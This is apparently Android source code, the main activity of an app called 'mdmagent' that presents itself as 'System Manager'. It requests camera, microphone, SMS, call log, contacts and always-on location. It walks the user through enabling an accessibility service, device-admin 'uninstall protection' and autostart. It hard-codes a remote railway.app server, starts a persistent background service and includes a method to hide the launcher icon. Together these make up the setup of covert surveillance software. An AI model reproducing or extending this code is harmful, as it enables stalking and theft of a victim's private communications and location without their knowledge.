package com.mdmagent.app;

import android.Manifest;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {

    private static final int RC_PERMS        = 1001;
    private static final int RC_BG_LOC       = 1002;
    private static final int RC_DEVICE_ADMIN = 2001;

    // Simplified steps — only dialog-based, no surprise Settings launches
    private static final int STEP_PERMISSIONS   = 0;
    private static final int STEP_BG_LOCATION   = 1;
    private static final int STEP_ACCESSIBILITY = 2;
    private static final int STEP_DEVICE_ADMIN  = 3;
    private static final int STEP_OEM_AUTOSTART = 4;
    private static final int STEP_DONE          = 5;

    private static final String PREFS_NAME = "mdm_setup";
    private static final String KEY_DONE   = "setup_done";

    private int     currentStep      = STEP_PERMISSIONS;
    private boolean waitingForResume = false;
    private ComponentName adminComponent;

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(MdmPlugin.class);
        registerPlugin(NativeSocketPlugin.class);
        super.onCreate(savedInstanceState);

        adminComponent = new ComponentName(this, MdmDeviceAdminReceiver.class);

        // Force Railway URL — clears any old local IP stored from previous sessions
        getSharedPreferences(MdmForegroundService.PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putString(MdmForegroundService.PREF_URL, "https://ping-1-production.up.railway.app")
            .apply();

        startForegroundService(new Intent(this, MdmForegroundService.class));

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        if (prefs.getBoolean(KEY_DONE, false)) {
            // Already set up — just show the app (WebView)
            return;
        }

        // First time — start setup wizard with a small delay so WebView loads first
        new Handler(Looper.getMainLooper()).postDelayed(
            () -> runStep(STEP_PERMISSIONS), 1500);
    }

    // ── Step runner ───────────────────────────────────────────────────────

    private void runStep(int step) {
        currentStep = step;
        switch (step) {
            case STEP_PERMISSIONS:   doPermissions();   break;
            case STEP_BG_LOCATION:   doBgLocation();    break;
            case STEP_ACCESSIBILITY: doAccessibility(); break;
            case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
            case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
            case STEP_DONE:          doFinish();        break;
        }
    }

    private void nextStep() { runStep(currentStep + 1); }

    // ── Step 0 — Runtime permissions ──────────────────────────────────────

    private void doPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                missing.add(perm);
        }
        if (!missing.isEmpty())
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), RC_PERMS);
        else
            nextStep();
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] results) {
        super.onRequestPermissionsResult(rc, perms, results);
        if (rc == RC_PERMS || rc == RC_BG_LOC) nextStep();
    }

    // ── Step 1 — Background location ──────────────────────────────────────

    private void doBgLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            new AlertDialog.Builder(this)
                .setTitle("Location — Always On")
                .setMessage("Agli screen mein 'Allow all the time' select karo taaki location background mein bhi mile.")
                .setCancelable(false)
                .setPositiveButton("Continue", (d, w) ->
                    ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, RC_BG_LOC))
                .setNegativeButton("Skip", (d, w) -> nextStep())
                .show();
        } else {
            nextStep();
        }
    }

    // ── Step 2 — Accessibility service ────────────────────────────────────

    private void doAccessibility() {
        if (isAccessibilityEnabled()) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Auto-Connect Setup (1/2)")
            .setMessage(
                "Phone restart ke baad auto-connect ke liye ek setting chahiye.\n\n" +
                "Steps:\n" +
                "1. Neeche 'Open Settings' dabao\n" +
                "2. 'System Manager' dhundho\n" +
                "3. Toggle ON karo → Allow dabao\n" +
                "4. Back press karke wapas aao")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String svc = getPackageName() + "/" + MdmAccessibilityService.class.getName();
            int on = Settings.Secure.getInt(
                getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (on == 1) {
                String list = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (list != null) {
                    TextUtils.SimpleStringSplitter sp = new TextUtils.SimpleStringSplitter(':');
                    sp.setString(list);
                    while (sp.hasNext()) {
                        if (sp.next().equalsIgnoreCase(svc)) return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ── Step 3 — Device Admin ─────────────────────────────────────────────

    private void doDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm == null || dpm.isAdminActive(adminComponent)) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Uninstall Protection (2/2)")
            .setMessage(
                "Unauthorized removal se bachane ke liye ek permission chahiye.\n\n" +
                "Agli screen mein 'Activate' button dabao.")
            .setCancelable(false)
            .setPositiveButton("Continue", (d, w) -> {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Prevents unauthorized removal of System Manager");
                startActivityForResult(i, RC_DEVICE_ADMIN);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_DEVICE_ADMIN) nextStep();
    }

    // ── Step 4 — OEM AutoStart (Vivo only on this device) ────────────────

    private void doOemAutoStart() {
        String mfr = Build.MANUFACTURER.toLowerCase();
        boolean isVivo   = mfr.contains("vivo");
        boolean isHuawei = mfr.contains("huawei") || mfr.contains("honor");
        boolean isOppo   = mfr.contains("oppo") || mfr.contains("realme");
        boolean isMiui   = isMiui() || mfr.contains("xiaomi") || mfr.contains("redmi");

        if (!isVivo && !isHuawei && !isOppo && !isMiui) { nextStep(); return; }

        String brand = isVivo ? "Vivo" : isHuawei ? "Huawei/Honor" : isOppo ? "OPPO/Realme" : "Xiaomi";
        new AlertDialog.Builder(this)
            .setTitle("AutoStart — " + brand)
            .setMessage(
                "Last step!\n\n" +
                "1. 'Open Settings' dabao\n" +
                "2. 'System Manager' dhundho\n" +
                "3. AutoStart toggle ON karo\n" +
                "4. Back press karo")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                openOemScreen(mfr, isMiui);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private void openOemScreen(String mfr, boolean isMiui) {
        if (isMiui) { openMiuiAutoStart(); return; }
        try {
            Intent i = new Intent();
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (mfr.contains("vivo")) {
                i.setComponent(new ComponentName("com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
            } else if (mfr.contains("huawei") || mfr.contains("honor")) {
                i.setComponent(new ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (mfr.contains("oppo") || mfr.contains("realme")) {
                i.setComponent(new ComponentName("com.coloros.safecenter",
                    "com.coloros.privacypermissionsentry.PermissionTopActivity"));
            }
            startActivity(i);
        } catch (Exception ignored) {
            try {
                Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                f.setData(Uri.parse("package:" + getPackageName()));
                startActivity(f);
            } catch (Exception ignored2) { nextStep(); }
        }
    }

    private void openMiuiAutoStart() {
        String[][] targets = {
            { "com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity" },
            { "com.miui.securitycenter", "com.miui.permcenter.MainAcitivity" },
            { "com.miui.securitycenter", "com.miui.securitycenter.MainActivity" },
        };
        for (String[] t : targets) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(t[0], t[1]));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return;
            } catch (Exception ignored) {}
        }
        try {
            Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            f.setData(Uri.parse("package:" + getPackageName()));
            startActivity(f);
        } catch (Exception ignored) { nextStep(); }
    }

    private boolean isMiui() {
        try { Class.forName("miui.os.Build"); return true; }
        catch (ClassNotFoundException e) { return false; }
    }

    // ── Step 5 — Done ────────────────────────────────────────────────────

    private void doFinish() {
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_DONE, true).apply();

        new AlertDialog.Builder(this)
            .setTitle("Setup Complete!")
            .setMessage("System Manager active hai aur background mein chal raha hai.")
            .setCancelable(true)
            .setPositiveButton("OK", null)
            .show();
    }

    private void hideLauncherIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.mdmagent.app.MainActivityLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ── onResume — return from Settings screens ───────────────────────────

    @Override
    public void onResume() {
        super.onResume();
        if (waitingForResume) {
            waitingForResume = false;
            nextStep();
        }
    }
}
